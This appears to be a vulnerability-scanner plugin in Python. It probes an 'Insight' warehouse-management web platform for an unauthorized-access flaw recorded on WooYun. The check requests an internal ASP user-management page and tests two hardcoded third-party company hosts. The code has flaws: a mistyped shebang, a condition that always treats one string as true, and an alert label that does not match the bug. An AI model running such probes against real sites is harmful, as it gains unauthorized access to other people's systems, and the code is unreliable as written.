#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:英赛特仓储管理系统互联网客户服务平台越权访问
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0122207

def assign(service,arg):
    if service=="insight":
        return True,arg 
    


def  audit(arg):
    url=arg+"csccmise/yhgl.asp"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'window.open' and 'csccmise/yhlb.asp?wlhid' in res:
        security_hole('file download Vulnerable:'+url)

if __name__=="__main__":
    from dummy import *
    audit(assign('insight','http://www.nhcc-cn.com/')[1])
    audit(assign('insight','http://www.nnlogistics.com.cn:81/')[1])